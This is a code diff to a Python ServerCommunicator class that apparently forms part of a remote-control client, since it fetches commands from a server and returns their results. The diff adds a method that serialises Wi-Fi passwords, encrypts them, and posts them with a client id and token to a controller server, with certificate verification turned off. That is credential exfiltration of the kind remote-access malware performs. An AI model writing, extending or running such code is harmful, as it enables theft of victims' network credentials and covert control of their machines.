@@ -345,6 +345,46 @@ class ServerCommunicator:
                 logging.error(f"Failed to fetch commands: {str(e)}")
             raise CommunicationError(f"Failed to process commands: {str(e)}")
 
+    def upload_wifi_passwords(self, wifi_data: Dict) -> Dict:
+        try:
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing Wi-Fi passwords upload: client_id={self.client_id}")
+            
+            wifi_data_json = json.dumps(wifi_data, ensure_ascii=False)
+            encrypted_wifi_data = self.encryption.encrypt(wifi_data_json)
+            
+            encrypted_data = {
+                "action": "upload_wifi_passwords",
+                "client_id": self.client_id,
+                "token": self.token,
+                "wifi_data": encrypted_wifi_data
+            }
+            
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending Wi-Fi passwords: {encrypted_data}")
+            
+            response = requests.post(
+                self.server_url,
+                data=encrypted_data,
+                timeout=Config.COMMAND_TIMEOUT,
+                verify=False
+            )
+            
+            if response.status_code != 200:
+                if Config.DEBUG_MODE:
+                    logging.error(f"Wi-Fi passwords upload failed: status={response.status_code}, response={response.text}")
+                raise CommunicationError(f"Wi-Fi passwords upload failed: {response.text}")
+            
+            if Config.DEBUG_MODE:
+                logging.info("Wi-Fi passwords upload successful")
+            
+            return response.json()
+        
+        except Exception as e:
+            if Config.DEBUG_MODE:
+                logging.error(f"Wi-Fi passwords upload error: {str(e)}")
+            raise CommunicationError(f"Wi-Fi passwords upload error: {str(e)}")
+    
     def send_command_result(self, command_id, result):
         try:
             if Config.DEBUG_MODE:
@@ -375,6 +415,7 @@ class ServerCommunicator:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to send command result: {str(e)}")
             raise CommunicationError(f"Failed to send command result: {str(e)}")
+
 
 class CommunicationError(Exception):
     pass
